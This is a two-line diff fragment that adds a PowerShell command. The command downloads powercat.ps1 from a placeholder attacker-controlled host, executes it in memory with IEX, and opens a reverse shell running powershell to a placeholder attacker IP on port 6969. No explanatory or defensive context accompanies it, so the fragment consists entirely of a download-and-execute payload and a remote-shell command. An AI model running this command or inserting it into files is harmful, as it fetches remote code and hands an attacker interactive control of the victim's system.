@@ -1,0 +1,2 @@
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://attackercontrolled/powercat.ps1');
+powercat -c attackip -p 6969 -e powershell"
